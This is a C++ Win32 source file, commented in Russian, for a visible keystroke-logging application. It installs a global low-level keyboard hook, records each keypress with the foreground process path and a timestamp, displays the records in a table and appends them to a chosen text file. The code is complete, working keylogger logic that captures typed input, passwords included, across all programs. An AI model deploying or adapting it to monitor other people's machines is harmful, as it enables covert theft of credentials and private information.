#include "framework.h"
#include "Keylogger.h"
#pragma comment(lib, "Comctl32.lib")
#pragma comment(lib, "Shlwapi.lib")


int APIENTRY wWinMain(_In_ HINSTANCE hInstance,
    _In_opt_ HINSTANCE hPrevInstance,
    _In_ LPWSTR    lpCmdLine,
    _In_ int       nCmdShow)
{
    UNREFERENCED_PARAMETER(hPrevInstance);
    UNREFERENCED_PARAMETER(lpCmdLine);

    // Устанавливаем имя для приложения
    wcscpy_s(szTitle, L"Перехватчик нажатий клавиш");
    wcscpy_s(szWindowClass, L"Перехватчик нажатий клавиш");

    MyRegisterClass(hInstance);

    // Инициализация общих элементов управления с помощью библиотеки Common Controls
    InitCommonControls();

    // Выполнить инициализацию приложения:
    if (!InitInstance(hInstance, nCmdShow))
    {
        return FALSE;
    }

    HACCEL hAccelTable = LoadAccelerators(hInstance, MAKEINTRESOURCE(IDC_KEYLOGGER));
    MSG msg;

    // Цикл основного сообщения:
    while (GetMessage(&msg, nullptr, 0, 0))
    {
        if (!TranslateAccelerator(msg.hwnd, hAccelTable, &msg))
        {
            TranslateMessage(&msg);
            DispatchMessage(&msg);
        }
    }

    return (int)msg.wParam;
}

ATOM MyRegisterClass(HINSTANCE hInstance)
{
    WNDCLASSEXW wcex;

    wcex.cbSize = sizeof(WNDCLASSEX);
    wcex.style = CS_HREDRAW | CS_VREDRAW;
    wcex.lpfnWndProc = WndProc;
    wcex.cbClsExtra = 0;
    wcex.cbWndExtra = 0;
    wcex.hInstance = hInstance;
    wcex.hIcon = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SMALL));
    wcex.hCursor = LoadCursor(nullptr, IDC_ARROW);
    wcex.hbrBackground = (HBRUSH)(COLOR_WINDOW + 1);
    wcex.lpszMenuName = MAKEINTRESOURCEW(IDC_KEYLOGGER);
    wcex.lpszClassName = szWindowClass;
    wcex.hIconSm = LoadIcon(hInstance, MAKEINTRESOURCE(IDI_SMALL));

    return RegisterClassExW(&wcex);
}


BOOL InitInstance(HINSTANCE hInstance, int nCmdShow)
{
    // Сохраняем маркер экземпляра в глобальной переменной
    hInst = hInstance;

    HWND hWnd = CreateWindowW(
        szWindowClass,               // имя класса
        szTitle,                     // заголовок окна
        WS_OVERLAPPED | WS_CAPTION | WS_SYSMENU | WS_MINIMIZEBOX, // стиль окна
        (GetSystemMetrics(SM_CXSCREEN) - 800) / 2, // Центрирование по горизонтали
        (GetSystemMetrics(SM_CYSCREEN) - 500) / 2, // Центрирование по вертикали
        865,                       // ширина окна
        500,                       // высота окна
        nullptr,                   // родительское окно
        nullptr,                   // меню
        hInstance,                 // экземпляр
        nullptr                    // дополнительные данные
    );

    if (!hWnd)
    {
        return FALSE;
    }

    ShowWindow(hWnd, nCmdShow);
    UpdateWindow(hWnd);

    // Создание списка ListView
    hwndListView = CreateWindowW(
        WC_LISTVIEW,
        L"",
        WS_BORDER | WS_CHILD | WS_VISIBLE | LVS_REPORT | WS_VSCROLL | WS_HSCROLL,
        0,
        60,
        850,
        381,
        hWnd,
        (HMENU)IDC_LISTVIEW,
        hInstance,
        nullptr
    );

    // Добавление колонок в список ListView
    DefineColumns(hwndListView);

    return TRUE;
}

// Процедура окна
LRESULT CALLBACK WndProc(HWND hWnd, UINT message, WPARAM wParam, LPARAM lParam)
{
    switch (message)
    {
    case WM_COMMAND:
    {
        int wmId = LOWORD(wParam);
        switch (wmId)
        {
        case IDM_EXIT:
            DestroyWindow(hWnd);
            break;
        case OnClearedField:
            SetWindowTextA(hEditControl, "");
            break;
        case OnCreateFile:
            CreateFileInSelectedFolder(hWnd);
            break;
        case OnOpenFile:
            OpenTextFile();
            break;
        case OnClearedList:
            keyloggerRecords.clear();
            ListView_DeleteAllItems(hwndListView);
            break;
        case OnRecordAction:

            // Меняем текст кнопки в зависимости от состояния
            if (isRecordStarted) {
                SetWindowText(hwndRecordButton, L"Начать запись");

                // Удаляем хук, если запись остановлена
                RemoveKeyboardHook();
            }
            else {
                SetWindowText(hwndRecordButton, L"Остановить запись");

                // Устанавливаем хук, если запись начата
                SetKeyboardHook();
            }

            // Переключаем состояние
            isRecordStarted = !isRecordStarted;

            break;
        default:
            return DefWindowProc(hWnd, message, wParam, lParam);
        }
        break;
    }
    case WM_CREATE:
        MainWndAddMenues(hWnd);
        MainWndAddWidgets(hWnd);
        break;
    case WM_DESTROY:
        RemoveKeyboardHook();
        PostQuitMessage(0);
        break;
    default:
        return DefWindowProc(hWnd, message, wParam, lParam);
    }
    return 0;
}

// Определение столбцов таблицы
void DefineColumns(HWND hwndLV)
{
    LVCOLUMN lvColumn;
    lvColumn.mask = LVCF_TEXT | LVCF_WIDTH | LVCF_SUBITEM;

    // Описание колонок: текст и ширина
    struct ColumnInfo {
        int width;         // Ширина колонки
        const WCHAR* name; // Имя колонки
    };

    ColumnInfo columns[] = {
        { 95, L"ID процесса"},
        { 425, L"Путь к запущенному процессу" },
        { 125, L"Дата и время действия" },
        { 105, L"Код клавиши" },
        { 100, L"Символ" }
    };

    int columnCount = sizeof(columns) / sizeof(columns[0]);

    // Добавление колонок в таблицу
    for (int i = 0; i < columnCount; ++i)
    {
        lvColumn.pszText = const_cast<LPWSTR>(columns[i].name);
        lvColumn.cx = columns[i].width;
        ListView_InsertColumn(hwndLV, i, &lvColumn);
    }
}

// Заполнение массива типа KeyloggerRecord
void KeyloggerFilling(HWND hwndListView) {

    // Удаляем все элементы перед добавлением новых
    ListView_DeleteAllItems(hwndListView);

    // Заполняем таблицу данными в обратном порядке
    for (int i = static_cast<int>(keyloggerRecords.size()) - 1; i >= 0; --i) {
        const auto& record = keyloggerRecords[i];

        LVITEM lvItem;
        lvItem.mask = LVIF_TEXT;

        // Индекс для добавления в верх списка
        lvItem.iItem = static_cast<int>(keyloggerRecords.size()) - 1 - i;

        // Индекс первого столбца (ID процесса)
        lvItem.iSubItem = 0;

        // Заполнение первого столбца (ID процесса)
        wstring processIdText = to_wstring(record.processId);
        lvItem.pszText = const_cast<LPWSTR>(processIdText.c_str());
        ListView_InsertItem(hwndListView, &lvItem);

        // Заполнение пути к запущенному процессу (столбец 1)
        ListView_SetItemText(hwndListView, lvItem.iItem, 1, const_cast<LPWSTR>(record.processPath.c_str()));

        // Заполнение даты и времени срабатывания клавиши (столбец 2)
        ListView_SetItemText(hwndListView, lvItem.iItem, 2, const_cast<LPWSTR>(record.dateTime.c_str()));

        // Заполнение кода клавиши (столбец 3)
        wstring keyCodeText = to_wstring(record.keyCode);
        ListView_SetItemText(hwndListView, lvItem.iItem, 3, const_cast<LPWSTR>(keyCodeText.c_str()));

        // Заполнение символа клавиши (столбец 4)
        ListView_SetItemText(hwndListView, lvItem.iItem, 4, const_cast<LPWSTR>(record.keyChar.c_str()));
    }
}

// Добавление пунктов меню
void MainWndAddMenues(HWND hwnd) {
    HMENU RootMenu = CreateMenu();
    AppendMenu(RootMenu, MF_STRING, OnCreateFile, L"Создать файл");
    AppendMenu(RootMenu, MF_STRING, OnOpenFile, L"Открыть файл");
    AppendMenu(RootMenu, MF_STRING, OnClearedList, L"Очистить список");
    AppendMenu(RootMenu, MF_STRING, IDM_EXIT, L"Выход");
    SetMenu(hwnd, RootMenu);
}

// Добавление виджетов в рабочую область приложения
void MainWndAddWidgets(HWND hwnd) {
    hwndRecordButton = CreateWindowA("button", "Начать запись", WS_VISIBLE | WS_CHILD | ES_CENTER, 25, 10, 150, 40, hwnd, (HMENU)OnRecordAction, NULL, NULL);

    // Метка для отображения пути к файлу
    hwndFilePathLabel = CreateWindowA("static", "Файл: Не выбран", WS_VISIBLE | WS_CHILD | SS_LEFT, 225, 20, 500, 20, hwnd, NULL, NULL, NULL);
}

// Функция-обработчик события OnOpenFile
void OpenTextFile() {

    // Проверяем, что файл был выбран
    if (filename[0] != '\0') {

        // Открываем файл с помощью связанной программы
        if ((int)ShellExecuteA(NULL, "open", filename, NULL, NULL, SW_SHOW) <= 32) {

            // Если открыть файл не удалось, показываем сообщение об ошибке
            MessageBoxA(NULL, "Не удалось открыть файл.", "Ошибка", MB_OK | MB_ICONERROR);
        }
    }
    else {

        // Если файл не выбран, показываем сообщение
        MessageBoxA(NULL, "Файл не выбран.", "Ошибка", MB_OK | MB_ICONWARNING);
    }
}

// Функция для обновления виджета с путем к файлу
void UpdateFilePathLabel() {
    if (hwndFilePathLabel) {

        // Формируем текст для отображения
        char labelText[512];
        snprintf(labelText, sizeof(labelText), "Файл: %s", filename[0] ? filename : "Не выбран");

        // Обновляем текст в виджете
        SetWindowTextA(hwndFilePathLabel, labelText);
    }
}

// Коллбэк-функция для установки начальной папки
int CALLBACK BrowseCallbackProc(HWND hwnd, UINT uMsg, LPARAM lParam, LPARAM lpData) {
    if (uMsg == BFFM_INITIALIZED) {

        // Устанавливаем начальную папку
        SendMessage(hwnd, BFFM_SETSELECTIONA, TRUE, lpData);
    }
    return 0;
}

// Диалоговое окно выбора папки
BOOL SelectFolderDialog(HWND hwnd, char* folderPath) {
    char exePath[MAX_PATH];

    // Получаем путь к текущему exe-файлу
    GetModuleFileNameA(NULL, exePath, MAX_PATH);

    // Убираем имя exe-файла, оставляя только каталог
    PathRemoveFileSpecA(exePath);

    BROWSEINFOA bi = { 0 };
    bi.hwndOwner = hwnd;
    bi.lpszTitle = "Выберите папку для создания файла";
    bi.ulFlags = BIF_USENEWUI | BIF_RETURNONLYFSDIRS;

    // Устанавливаем коллбэк
    bi.lpfn = BrowseCallbackProc;

    // Передаем путь к exe как начальную папку
    bi.lParam = (LPARAM)exePath;

    LPITEMIDLIST pidl = SHBrowseForFolderA(&bi);
    if (pidl) {

        // Получаем путь выбранной папки
        SHGetPathFromIDListA(pidl, folderPath);

        // Освобождаем память
        CoTaskMemFree(pidl);
        return TRUE;
    }
    return FALSE;
}

// Функция для создания файла в формате "ДДММГГГГ-ЧЧММСС" в выбранной папке
void CreateFileInSelectedFolder(HWND hwnd) {

    char folderPath[MAX_PATH];

    if (SelectFolderDialog(hwnd, folderPath)) {

        // Получаем текущую дату и время
        time_t now = time(0);
        struct tm tstruct;
        localtime_s(&tstruct, &now);
        char fileName[64];
        strftime(fileName, sizeof(fileName), "%d%m%Y-%H%M%S.txt", &tstruct);

        // Формируем полный путь к файлу в глоабльную переменную filename
        snprintf(filename, MAX_PATH, "%s\\%s", folderPath, fileName); 

        // Создаем файл в выбранной папке
        HANDLE hFile = CreateFileA(
            filename,
            GENERIC_WRITE,
            0,
            NULL,
            CREATE_NEW,
            FILE_ATTRIBUTE_NORMAL,
            NULL
        );

        if (hFile != INVALID_HANDLE_VALUE) {
            CloseHandle(hFile);
            MessageBoxA(hwnd, "Файл успешно создан!", "Успех", MB_OK | MB_ICONINFORMATION);
        }
        else {
            MessageBoxA(hwnd, "Не удалось создать файл.", "Ошибка", MB_OK | MB_ICONERROR);
        }

        UpdateFilePathLabel();
    }
    else {
        MessageBoxA(hwnd, "Выбор папки отменен.", "Отмена", MB_OK | MB_ICONINFORMATION);
    }
}

// Функция-словарь для обработки специальных клавиш
wstring GetKeyStringFromCode(int keyCode) {
    switch (keyCode) {

    // Управляющие клавиши
    case VK_RETURN:     return L"ENTER";     
    case VK_BACK:       return L"BACKSPACE";   
    case VK_TAB:        return L"TAB";          
    case VK_SPACE:      return L"SPACE";     
    case VK_SHIFT:      return L"SHIFT";      
    case VK_CONTROL:    return L"CTRL";      
    case VK_MENU:       return L"ALT";       
    case VK_ESCAPE:     return L"ESC";         
    case VK_CAPITAL:    return L"CAPS LOCK";    
    case VK_LSHIFT:     return L"LEFT SHIFT";  
    case VK_RSHIFT:     return L"RIGHT SHIFT"; 
    case VK_LCONTROL:   return L"LEFT CTRL";  
    case VK_RCONTROL:   return L"RIGHT CTRL";
    case VK_LMENU:      return L"LEFT ALT";  
    case VK_RMENU:      return L"RIGHT ALT"; 

    // Функциональные клавиши
    case VK_F1:  return L"F1";
    case VK_F2:  return L"F2";
    case VK_F3:  return L"F3";
    case VK_F4:  return L"F4";
    case VK_F5:  return L"F5";
    case VK_F6:  return L"F6";
    case VK_F7:  return L"F7";
    case VK_F8:  return L"F8";
    case VK_F9:  return L"F9";
    case VK_F10: return L"F10";
    case VK_F11: return L"F11";
    case VK_F12: return L"F12";
    case VK_SCROLL: return L"SCROLL LK";

    // Символы на цифровой клавиатуре
    case VK_NUMLOCK: return L"NUM LOCK";
    case VK_NUMPAD0: return L"NUMPAD 0";
    case VK_NUMPAD1: return L"NUMPAD 1";
    case VK_NUMPAD2: return L"NUMPAD 2";
    case VK_NUMPAD3: return L"NUMPAD 3";
    case VK_NUMPAD4: return L"NUMPAD 4";
    case VK_NUMPAD5: return L"NUMPAD 5";
    case VK_NUMPAD6: return L"NUMPAD 6";
    case VK_NUMPAD7: return L"NUMPAD 7";
    case VK_NUMPAD8: return L"NUMPAD 8";
    case VK_NUMPAD9: return L"NUMPAD 9";

    // Специальные клавиши из блока
    case VK_PRIOR:     return L"PAGE UP";       
    case VK_NEXT:      return L"PAGE DOWN";    
    case VK_END:       return L"END";        
    case VK_HOME:      return L"HOME";        
    case VK_LEFT:      return L"LEFT ARROW";   
    case VK_UP:        return L"UP ARROW";    
    case VK_RIGHT:     return L"RIGHT ARROW";  
    case VK_DOWN:      return L"DOWN ARROW";  
    case VK_SELECT:    return L"SELECT";       
    case VK_PRINT:     return L"PRINT";       
    case VK_EXECUTE:   return L"EXECUTE";      
    case VK_SNAPSHOT:  return L"PRINT SCREEN";  
    case VK_INSERT:    return L"INSERT";      
    case VK_DELETE:    return L"DELETE";      
    case VK_HELP:      return L"HELP";    

    // Символы на клавиатуре
    case VK_OEM_PLUS:   return L"+";    
    case VK_OEM_MINUS:  return L"-";    
    case VK_OEM_COMMA:  return L",";     
    case VK_OEM_PERIOD: return L".";    

    default: return L"UNKNOWN";                  // Неизвестная клавиша
    }
}

// Запись в лог-файл в формате ANSI
void WriteToFileANSI(const KeyloggerRecord& record) {

    // Конвертируем поля KeyloggerRecord в кодировку ANSI
    int bufferSize = WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, NULL, 0, NULL, NULL);
    char* processPathAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.processPath.c_str(), -1, processPathAnsi, bufferSize, NULL, NULL);

    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, NULL, 0, NULL, NULL);
    char* dateTimeAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.dateTime.c_str(), -1, dateTimeAnsi, bufferSize, NULL, NULL);

    bufferSize = WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, NULL, 0, NULL, NULL);
    char* keyCharAnsi = new char[bufferSize];
    WideCharToMultiByte(CP_ACP, 0, record.keyChar.c_str(), -1, keyCharAnsi, bufferSize, NULL, NULL);

    // Открываем файл для записи в кодировке ANSI
    ofstream outFile(filename, ios::app);
    if (outFile.is_open()) {
        outFile << record.processId << ";"
            << processPathAnsi << ";"
            << dateTimeAnsi << ";"
            << record.keyCode << ";"
            << keyCharAnsi << endl;
        outFile.close();
    }

    // Освобождаем память
    delete[] processPathAnsi;
    delete[] dateTimeAnsi;
    delete[] keyCharAnsi;
}

// Функция-обработчик хука клавиатуры
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam) {
    if (nCode == HC_ACTION) {
        KBDLLHOOKSTRUCT* pKeyboard = (KBDLLHOOKSTRUCT*)lParam;

        // Обрабатываем только нажатие клавиш
        if (wParam == WM_KEYDOWN) {
            DWORD processId;
            GetWindowThreadProcessId(GetForegroundWindow(), &processId);

            // Получаем путь к процессу
            wchar_t processPath[MAX_PATH];
            HANDLE hProcess = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, processId);
            if (hProcess) {
                DWORD pathLength = GetModuleFileNameExW(hProcess, NULL, processPath, MAX_PATH);
                CloseHandle(hProcess);
            }

            // Получаем текущее время
            time_t currentTime = time(NULL);
            tm timeInfo;
            localtime_s(&timeInfo, &currentTime);

            wstring dateTime(20, L'\0');
            wcsftime(&dateTime[0], dateTime.size(), L"%Y-%m-%d %H:%M:%S", &timeInfo);

            // Получаем состояние клавиатуры
            BYTE keyboardState[256];
            BOOL state = GetKeyboardState(keyboardState);

            // Буфер для символов
            WCHAR szBuffer[20] = L"";
            int nChar = ToUnicode(pKeyboard->vkCode, pKeyboard->scanCode, keyboardState, szBuffer, 20, 0);

            // Создаем запись
            KeyloggerRecord record;
            record.processId = processId;
            record.processPath = processPath;
            record.dateTime = dateTime;
            record.keyCode = pKeyboard->vkCode;

            // Карта для отображения специальных клавиш
            static const unordered_map<int, wstring> specialKeys = {
                {VK_BACK, L"BACKSPACE"},
                {VK_TAB, L"TAB"},
                {VK_RETURN, L"ENTER"},
                {VK_ESCAPE, L"ESC"},
                {VK_SPACE, L"SPACE"}
            };

            // Если символ был получен
            if (nChar > 0) {

                // Преобразуем символы в строку
                record.keyChar = wstring(szBuffer, nChar);

                // Если это специальная клавиша, заменяем на соответствующее имя
                auto it = specialKeys.find(pKeyboard->vkCode);
                if (it != specialKeys.end()) {

                    // Заменяем на строку для специальной клавиши
                    record.keyChar = it->second;
                }
            }
            // Если символ не был получен (специальная клавиша), то используем GetKeyStringFromCode
            else {

                // Получаем строку для специальных клавиш
                record.keyChar = GetKeyStringFromCode(pKeyboard->vkCode);
                if (record.keyChar.empty()) {

                    // Устанавливаем значение по умолчанию для неизвестных клавиш
                    record.keyChar = L"UNKNOWN";
                }
            }


            // Запись в файл только если путь был выбран
            if (filename[0] != 0) { 
                WriteToFileANSI(record);
            }

            // Добавляем запись в список (если нужно)
            keyloggerRecords.push_back(record);

        }
    }

    KeyloggerFilling(hwndListView);

    return CallNextHookEx(keyboardHook, nCode, wParam, lParam);
}

// Функция установки хука
void SetKeyboardHook() {
    keyboardHook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if (!keyboardHook) {
        MessageBox(NULL, L"Failed to install keyboard hook!", L"Error", MB_OK | MB_ICONERROR);
    }
}

// Функция удаление хука
void RemoveKeyboardHook() {
    if (keyboardHook) {
        UnhookWindowsHookEx(keyboardHook);
    }
}
